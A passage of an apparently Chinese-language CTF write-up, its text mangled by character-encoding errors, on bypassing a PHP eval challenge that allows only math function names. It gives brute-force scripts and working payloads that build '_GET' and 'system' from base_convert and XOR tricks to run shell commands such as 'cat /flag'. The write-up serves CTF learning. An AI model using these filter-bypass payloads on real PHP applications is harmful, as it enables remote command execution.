class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  <span class="comment">//æå–payloadä¸­å‡½æ•°ååŠå˜é‡å</span></span><br></pre></td></tr></table></figure></div><blockquote><p>phpå‚è€ƒæ‰‹å†Œä¸­æåˆ°ï¼Œç”¨äºåŒ¹é…phpæœ‰æ•ˆå˜é‡åï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™<code>[a-zA-Z_/x7f-/xff][a-zA-Z0-9_/x7f-/xff]*</code> å› æ­¤payloadä¸­è‹¥ä½¿ç”¨å˜é‡ï¼Œå‘½åå¿…é¡»åœ¨ç™½åå•å‡½æ•°ä¸­é€‰æ‹©,å¦‚æœæ˜¯æ•°ç»„ç´¢å¼•ä¹Ÿå¯ä»¥ç”¨çº¯æ•°å­—(ä¸ç¬¦åˆå˜é‡åå‘½åæ³•åˆ™)</p></blockquote><h3 id="åˆ©ç”¨ç‚¹"><a href="#åˆ©ç”¨ç‚¹" class="headerlink" title="åˆ©ç”¨ç‚¹"></a>åˆ©ç”¨ç‚¹</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><blockquote><p>evalå‡½æ•°å‚æ•°è‹¥æ˜¯å­—ç¬¦ä¸²ï¼Œå¿…é¡»ç¬¦åˆphpä»£ç è¯­æ³•ï¼Œå› æ­¤å¯ä»¥æ’å…¥å¤šè¡Œä»£ç </p></blockquote><h2 id="0x01-åˆ©ç”¨mathå‡½æ•°æ„é€ å‡½æ•°å"><a href="#0x01-åˆ©ç”¨mathå‡½æ•°æ„é€ å‡½æ•°å" class="headerlink" title="0x01 åˆ©ç”¨mathå‡½æ•°æ„é€ å‡½æ•°å"></a>0x01 åˆ©ç”¨mathå‡½æ•°æ„é€ å‡½æ•°å</h2><h3 id="è¿›åˆ¶è½¬æ¢â€“è·å–å°å†™å­—æ¯"><a href="#è¿›åˆ¶è½¬æ¢â€“è·å–å°å†™å­—æ¯" class="headerlink" title="è¿›åˆ¶è½¬æ¢â€“è·å–å°å†™å­—æ¯"></a>è¿›åˆ¶è½¬æ¢â€“è·å–å°å†™å­—æ¯</h3><p>åˆ©ç”¨åˆ°è¿›åˆ¶è½¬æ¢ï¼Œä»11è¿›åˆ¶åˆ°36è¿›åˆ¶å‡æœ‰å°å†™å­—æ¯ï¼Œåœ¨ä¿è¯è½¬æ¢ç»“æœç®€æ´åŠçº¯æ•°å­—çš„æƒ…å†µä¸‹ï¼Œé€‰æ‹©36è¿›åˆ¶è½¬10è¿›åˆ¶(36è¿›åˆ¶å«a-z)</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…ˆåå‘</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&quot;cat&quot;</span>,<span class="number">36</span>,<span class="number">10</span>);<span class="comment">//15941</span></span><br><span class="line"><span class="comment">//è¿™æ ·å°±å¯ä»¥ç”¨çº¯æ•°å­—é€šè¿‡ä¸‰åå…­è¿›åˆ¶è½¬æ¢å¾—åˆ°çº¯å­—æ¯å­—ç¬¦ä¸²äº†</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="number">15941</span>,<span class="number">10</span>,<span class="number">36</span>);<span class="comment">//cat</span></span><br></pre></td></tr></table></figure></div><h3 id="å­—ç¬¦ä¸²å¼‚æˆ–â€“è·å–ç‰¹æ®Šå­—ç¬¦åŠå…¶ç»„åˆ"><a href="#å­—ç¬¦ä¸²å¼‚æˆ–â€“è·å–ç‰¹æ®Šå­—ç¬¦åŠå…¶ç»„åˆ" class="headerlink" title="å­—ç¬¦ä¸²å¼‚æˆ–â€“è·å–ç‰¹æ®Šå­—ç¬¦åŠå…¶ç»„åˆ"></a>å­—ç¬¦ä¸²å¼‚æˆ–â€“è·å–ç‰¹æ®Šå­—ç¬¦åŠå…¶ç»„åˆ</h3><h4 id="å¼‚æˆ–æ€§è´¨"><a href="#å¼‚æˆ–æ€§è´¨" class="headerlink" title="å¼‚æˆ–æ€§è´¨"></a>å¼‚æˆ–æ€§è´¨</h4><ol><li>ç»“åˆå¾‹a ^ b ^ c &#x3D; a ^ c ^ b</li><li>äº¤æ¢å¾‹a ^ b &#x3D; b ^ a</li><li>æ•°å€¼äº¤æ¢ï¼ˆèƒ½äº¤æ¢ a ä¸ b çš„å€¼ï¼‰a &#x3D; a ^ b; b &#x3D; a ^ b; a &#x3D; a ^ b;</li><li>a^b^b&#x3D;a</li></ol><h4 id="phpå­—ç¬¦ä¸²å¼‚æˆ–åˆ†ä¸ºä¸¤ç§æƒ…å†µ"><a href="#phpå­—ç¬¦ä¸²å¼‚æˆ–åˆ†ä¸ºä¸¤ç§æƒ…å†µ" class="headerlink" title="phpå­—ç¬¦ä¸²å¼‚æˆ–åˆ†ä¸ºä¸¤ç§æƒ…å†µ"></a>phpå­—ç¬¦ä¸²å¼‚æˆ–åˆ†ä¸ºä¸¤ç§æƒ…å†µ</h4><ul><li><p>é•¿åº¦ä¸€è‡´çš„å­—ç¬¦ä¸²å¼‚æˆ–ï¼Œå¯¹åº”å­—ç¬¦å„è‡ªè½¬æ¢æˆasciiç å€¼å¼‚æˆ–åå¾—åˆ°æ–°å­—ç¬¦ï¼Œç»„æˆæ–°å­—ç¬¦ä¸²</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;tan&quot;</span>^<span class="string">&quot;*\/&quot;</span>;<span class="comment">//^=A</span></span><br></pre></td></tr></table></figure></div></li><li><p>é•¿åº¦ä¸ä¸€è‡´çš„å­—ç¬¦ä¸²å¼‚æˆ–ï¼ŒæŒ‰æœ€çŸ­çš„å­—ç¬¦ä¸²é•¿åº¦æŒ‰ä½å¼‚æˆ–</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;tan&quot;</span>^<span class="string">&quot;*&quot;</span>;<span class="comment">//^</span></span><br></pre></td></tr></table></figure></div></li></ul><p>å¼‚æˆ–å­—ç¬¦ä¸²å¯ä»¥æ„é€ å‡ºæ–°å­—ç¬¦ï¼Œä½†åªç”¨ç™½åå•çš„å‡½æ•°åçš„è¯ï¼Œå¤§å¤šæ˜¯asciiç å€¼æ¥è¿‘çš„å°å†™å­—æ¯ï¼Œå¼‚æˆ–åå¾—åˆ°çš„ä¹Ÿå¤šæ˜¯asciiç å€¼å°çš„<u>ä¸å¯è§å­—ç¬¦</u>ï¼Œä¸å¤Ÿå…¨é¢ã€‚</p><p>å› æ­¤å¯ä»¥åˆ©ç”¨<code>a^b^b=a</code>è¿™ä¸ªæ€§è´¨ï¼Œå°†açœ‹ä½œè¦è·å–çš„ç‰¹æ®Šå­—ç¬¦ï¼Œbä¸ºç™½åå•å‡½æ•°åå¼‚æˆ–ç»„åˆ,é è„šæœ¬çˆ†ç ´å‡ºå¯ä»¥é€šè¿‡è¿›åˆ¶è½¬æ¢è¡¨ç¤ºçš„<code>a^b</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//çˆ†ç ´è„šæœ¬</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist1</span> = [<span class="string">&#x27;abs&#x27;</span>,<span class="string">&#x27;...&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="variable">$whitelist2</span> = [ <span class="string">&#x27;abs&#x27;</span>,<span class="string">&#x27;...&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];<span class="comment">//ä¸whitelist1ç›¸åŒ</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$whitelist1</span> <span class="keyword">as</span> <span class="variable">$i</span>):</span><br><span class="line">   <span class="keyword">foreach</span> (<span class="variable">$whitelist2</span> <span class="keyword">as</span> <span class="variable">$k</span>):</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$k</span>^<span class="variable">$i</span>^<span class="string">&quot; /&quot;</span>;<span class="comment">//a^b</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;   &quot;</span> . <span class="variable">$i</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$k</span>;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   <span class="keyword">endforeach</span>;</span><br><span class="line"><span class="keyword">endforeach</span>;</span><br></pre></td></tr></table></figure></div><blockquote><p>è¾“å‡ºç»“æœè¯´æ˜</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span>   tanh exp <span class="comment">//æ„æ€æ˜¯&quot; /&quot;^tanh^exp=&quot;16&quot;</span></span><br><span class="line"><span class="comment">//å› æ­¤è¦æƒ³å¾—åˆ°&quot; /&quot;åªè¦</span></span><br><span class="line"><span class="title function_ invoke__">dechex</span>(<span class="number">22</span>)^tanh^exp  <span class="comment">//å³&quot; /&quot;^tanh^exp^tanh^exp=&quot; /&quot;^0=&quot; /&quot;</span></span><br><span class="line"><span class="title function_ invoke__">hexdec</span>(<span class="number">10</span>)^tanh^exp<span class="comment">//ä¹Ÿå¯ä»¥</span></span><br></pre></td></tr></table></figure></div><h4 id="æ³¨æ„âš ï¸"><a href="#æ³¨æ„âš ï¸" class="headerlink" title="æ³¨æ„âš ï¸"></a>æ³¨æ„âš ï¸</h4><ul><li><p>ä¸èƒ½ç›´æ¥<code>16^tanh^exp</code> ï¼Œè¿™æ ·çš„16ä¼šè¢«å½“ä½œintå‹æ•°æ®å¤„ç†ï¼Œä½¿ç”¨è¿›åˆ¶è½¬æ¢å‡½æ•°å¯ä»¥è½¬æˆstringç±»å‹ï¼ŒåŒæ—¶é€‰å–çš„æ•°å€¼è½¬æˆ16è¿›åˆ¶ä¸èƒ½æœ‰å­—æ¯ã€‚</p></li><li><p>æ ¹æ®é•¿åº¦ä¸ä¸€è‡´å­—ç¬¦ä¸²å¼‚æˆ–çš„è¿ç®—è§„åˆ™ï¼Œç™½åå•ä¸­æœ€çŸ­çš„æ˜¯piï¼Œå› æ­¤ç‰¹æ®Šå­—ç¬¦ç»„åˆå°½é‡ä¸è¶…è¿‡ä¸¤ä¸ªï¼Œå¦‚æœä¸€å®šè¦æ›´é•¿çš„ç‰¹æ®Šå­—ç¬¦ç»„åˆï¼Œè¦åˆ é™¤ç™½åå•ä¸­è¾ƒçŸ­çš„å‡½æ•°åï¼Œä¸ç„¶å¾—åˆ°çš„ç»“æœéƒ½æ˜¯æˆªæ–­çš„ï¼Œè€Œç‰¹æ®Šå­—ç¬¦ç»„åˆè¶Šé•¿ï¼Œç™½åå•ä¸­å¯ç”¨å‡½æ•°åä¹Ÿå°±è¶Šå°‘ï¼Œå‡ºç°çº¯æ•°å­—ç»“æœçš„å¯èƒ½æ€§ä¹Ÿè¶Šä½ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¿™é‡Œä¸èƒ½ç›´æ¥æ„é€ <code>system(&#39;cat /flag&#39; )</code></p></li></ul></blockquote><h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><p>ä¸€æ—¦å°†ç‰¹æ®Šå­—ç¬¦æ”¹æˆå¤§å†™å­—æ¯æˆ–ä¸ä¸‹åˆ’çº¿çš„ç»„åˆï¼Œè¾“å‡ºä¸­å‡ ä¹æ²¡æœ‰çº¯æ•°å­—ç»“æœã€‚</p><h3 id="å¼•å…¥æ•°å­—å­—ç¬¦ä¸²çš„å¼‚æˆ–â€“æ„é€ ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆ"><a href="#å¼•å…¥æ•°å­—å­—ç¬¦ä¸²çš„å¼‚æˆ–â€“æ„é€ ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆ" class="headerlink" title="å¼•å…¥æ•°å­—å­—ç¬¦ä¸²çš„å¼‚æˆ–â€“æ„é€ ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆ"></a>å¼•å…¥æ•°å­—å­—ç¬¦ä¸²çš„å¼‚æˆ–â€“æ„é€ ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆ</h3><p>ä¸Šé¢çš„å¼‚æˆ–ç»“æœå¯ä»¥å½’çº³æˆ<code>ç‰¹æ®Šå­—ç¬¦ç»„åˆ^ç™½åå•å‡½æ•°1^ç™½åå•å‡½æ•°2=çº¯æ•°å­—å­—ç¬¦ä¸²</code>ã€‚</p><p>å› æ­¤å¯ä»¥åˆç†æ¨æµ‹<code>çº¯æ•°å­—å­—ç¬¦ä¸²^ç™½åå•å‡½æ•°1^ç™½åå•å‡½æ•°2=ç‰¹æ®Šå­—ç¬¦ç»„åˆ</code>ã€‚</p><p>çº¯å­—ç¬¦ä¸²å¦‚æœç”¨<code>dechex</code>çš„æ–¹å¼è½¬æ¢ï¼Œéå¸¸æµªè´¹payloadé•¿åº¦ï¼Œå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥æ—¶ç±»å‹è½¬æ¢çš„ç‰¹æ€§ã€‚</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span>=(<span class="number">1</span>).(<span class="number">2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);<span class="comment">//string(2) &quot;12&quot;</span></span><br></pre></td></tr></table></figure></div><p>çˆ†ç ´è„šæœ¬</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;...&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">0</span>;<span class="variable">$k</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;<span class="comment">//$i $jå­—ç¬¦ä¸²æ‹¼æ¥å¾—åˆ°&quot;00&quot;-&quot;99&quot;</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>ç”±äºpiçš„å­˜åœ¨ï¼Œæ„é€ å‡ºæ¥çš„ç»„åˆéƒ½æ˜¯ä¸¤ä¸ªå­—ç¬¦ï¼Œä¼šæƒŠå–œåœ°å‘ç°å¤§å¤šæ•°ä¸ºä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ç»„åˆã€‚</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç»“æœä¸­ tanh^<span class="number">15</span>==&gt;ET is_nan^<span class="number">64</span>==&gt;_G </span><br><span class="line">å› æ­¤æ„é€  (is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>)) æ­£æ˜¯ <span class="string">&quot;_G&quot;</span>.<span class="string">&quot;ET&quot;</span> ï¼Œå³ <span class="string">&quot;_GET&quot;</span></span><br></pre></td></tr></table></figure></div><p>å†æ ¹æ®PHPå¯å˜å˜é‡çš„ç‰¹æ€§</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="comment">//_GET</span></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;;<span class="comment">//$_GET[1]</span></span><br></pre></td></tr></table></figure></div><p>{}å¯ä»¥ä»£æ›¿[],è¿™æ ·å°±å¯ä»¥é€šè¿‡getä¼ å‚æ•°ï¼Œç¼©çŸ­payloadé•¿åº¦</p></blockquote><p>$_GET[1]æ¥æ”¶çš„æ•°å€¼ä¼šè½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå› æ­¤å³ä½¿æ‹¼æ¥åˆ°äº†ä»£ç ä¸­ä¹Ÿæ— æ³•æ‰§è¡Œ</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072214590.jpg"                      alt="1"                ><figcaption>1</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072214171.jpg"                      alt="2"                ><figcaption>2</figcaption></figure></p><p>å› æ­¤éœ€è¦åƒevalè¿™æ ·çš„å‡½æ•°æ‰§è¡Œå­—ç¬¦ä¸²phpä»£ç </p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="title function_ invoke__">base_convert</span>(<span class="number">42633</span>,<span class="number">19</span>,<span class="number">33</span>)(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure></div><p>ä¹Ÿå¯ä»¥åˆ©ç”¨phpå¯å˜å‡½æ•°çš„ç‰¹æ€§ï¼š<code>($a)[system]($_GET[1])</code> â€“&gt;phpä¼šå°†<code>$_GET[1]</code>çš„å†…å®¹å½“ä½œå‚æ•°ä¼ å…¥systemå‡½æ•°æ‰§è¡Œã€‚<code>$a</code>åªè¦æ±‚æ˜¯ä¸ªå˜é‡ï¼Œåœ¨è¿™é¢˜çš„èƒŒæ™¯ä¸‹å¯ä»¥ç”¨<code>$pi</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="variable">$pi</span>&#123;<span class="number">0</span>&#125;(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat /flag</span><br></pre></td></tr></table></figure></div><h2 id="0x02-payloadç¼©çŸ­æŠ€å·§"><a href="#0x02-payloadç¼©çŸ­æŠ€å·§" class="headerlink" title="0x02 payloadç¼©çŸ­æŠ€å·§"></a>0x02 payloadç¼©çŸ­æŠ€å·§</h2><h3 id="é€šè¿‡å¤–éƒ¨ä¼ å‚æ•°"><a href="#é€šè¿‡å¤–éƒ¨ä¼ å‚æ•°" class="headerlink" title="é€šè¿‡å¤–éƒ¨ä¼ å‚æ•°"></a>é€šè¿‡å¤–éƒ¨ä¼ å‚æ•°</h3><ul><li><p>ä½¿ç”¨$_GET[1]ï¼Œç´¢å¼•é€‰æ‹©æœ€ç®€çŸ­ä¸”ç¬¦åˆé¢˜ç›®è¦æ±‚çš„æ•°å­—1ï¼Œç³»ç»Ÿå‘½ä»¤é€šè¿‡1ä¼ å‚ï¼Œä¸å æœ‰payload</p></li><li><p>ä½¿ç”¨getallheadersè·å–è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå°†ç´¢å¼•è®¾æˆ1ï¼Œå°†è·å–headerä¸­keyä¸º1çš„valueï¼Œå†å°†è¿™ä¸ªç»“æœä¼ å…¥execå‡½æ•°ï¼Œä½†è¿™ä¸ªpayloadè¾ƒé•¿ï¼Œè¶…è¿‡60å­—ç¬¦</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//base_convert(696468,10,36) -&gt; exec</span></span><br><span class="line"><span class="comment">//base_convert(8768397090111664438,10,30) -&gt; getallheaders</span></span><br><span class="line"><span class="comment">//exec(getallheaders()&#123;1&#125;)</span></span><br></pre></td></tr></table></figure></div></li></ul><h3 id="ç©·ä¸¾è¿›åˆ¶è½¬æ¢"><a href="#ç©·ä¸¾è¿›åˆ¶è½¬æ¢" class="headerlink" title="ç©·ä¸¾è¿›åˆ¶è½¬æ¢"></a>ç©·ä¸¾è¿›åˆ¶è½¬æ¢</h3><p>å¦‚æœè¦å¾—åˆ°flagå­—ç¬¦ä¸²ï¼Œ10è¿›åˆ¶è½¬36è¿›åˆ¶éœ€è¦æ•°å­—ä¸º727432,æœ‰6ä½ï¼Œè€Œé€šè¿‡è„šæœ¬ç©·ä¸¾+æ­£åˆ™åŒ¹é…ç­›é€‰å¯ä»¥å‘ç°32è¿›åˆ¶è½¬22è¿›åˆ¶æ—¶ï¼Œåªéœ€è¦4ä½æ•°å­—å°±å¯ä»¥å¾—åˆ°flag</p><p>è„šæœ¬å¦‚ä¸‹</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="variable">$num</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$payload</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$tmp</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$payload</span>,<span class="variable">$i</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$tmp</span>)-<span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>&gt;<span class="variable">$num</span>)</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">11</span>+<span class="variable">$num</span>;<span class="variable">$i</span>&lt;=<span class="number">36</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">10</span>;<span class="variable">$j</span>&lt;=<span class="number">36</span>;<span class="variable">$j</span>++) &#123;</span><br><span class="line">        <span class="variable">$res</span>.= <span class="variable">$i</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$j</span> . <span class="string">&#x27; &#x27;</span> . <span class="title function_ invoke__">base_convert</span>(<span class="variable">$payload</span>, <span class="variable">$i</span>, <span class="variable">$j</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$payload</span>);<span class="variable">$i</span>&lt;<span class="number">2</span>*<span class="title function_ invoke__">strlen</span>(<span class="variable">$payload</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d&#123;2&#125;\s\d&#123;2&#125;\s\d&#123;&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;&#125;\n/&#x27;</span>,<span class="variable">$res</span>,<span class="variable">$mc</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$mc</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072214513.jpg"                      alt="image-20220809211543165"                ><figcaption>image-20220809211543165</figcaption></figure></p><blockquote><p><code>base_convert(5648,32,22)--&gt;&#39;flag&#39;</code></p></blockquote><h2 id="0x03-ä¸€äº›å°è¯•"><a href="#0x03-ä¸€äº›å°è¯•" class="headerlink" title="0x03 ä¸€äº›å°è¯•"></a>0x03 ä¸€äº›å°è¯•</h2><h3 id="èŠ±æ‹¬å·"><a href="#èŠ±æ‹¬å·" class="headerlink" title="èŠ±æ‹¬å·"></a>èŠ±æ‹¬å·</h3><p>ä¸Šé¢çš„payloadå‡ ä¹éƒ½ä½¿ç”¨äº†èŠ±æ‹¬å·æ¥è®¿é—®æ•°ç»„ï¼Œå¦‚æœé¢˜ç›®è¿‡æ»¤äº†èŠ±æ‹¬å·ï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥åœ¨ä¿è¯é•¿åº¦å°½å¯èƒ½å°çš„æƒ…å†µä¸‹,æ„é€ æ— èŠ±æ‹¬å·payload</p><blockquote><p>PHP7.4ä¸å†èƒ½å¤Ÿä½¿ç”¨èŠ±æ‹¬å·æ¥è®¿é—®<a class="link"   href="https://www.yuanmaluntan.com/tags-11630.html" >æ•°ç»„ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>æˆ–è€…å­—ç¬¦ä¸²çš„åç§».éœ€è¦å°†{}ä¿®æ”¹æˆ[] ï¼ˆæœ¬é¢˜ç¯å¢ƒä¸º7.3.9ï¼‰</p></blockquote><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202312072226764.jpg"                      alt="4"                ><figcaption>4</figcaption></figure></p><h3 id="æ— èŠ±æ‹¬å·payload"><a href="#æ— èŠ±æ‹¬å·payload" class="headerlink" title="æ— èŠ±æ‹¬å·payload"></a>æ— èŠ±æ‹¬å·payload</h3><p>ç”±äºä¼ 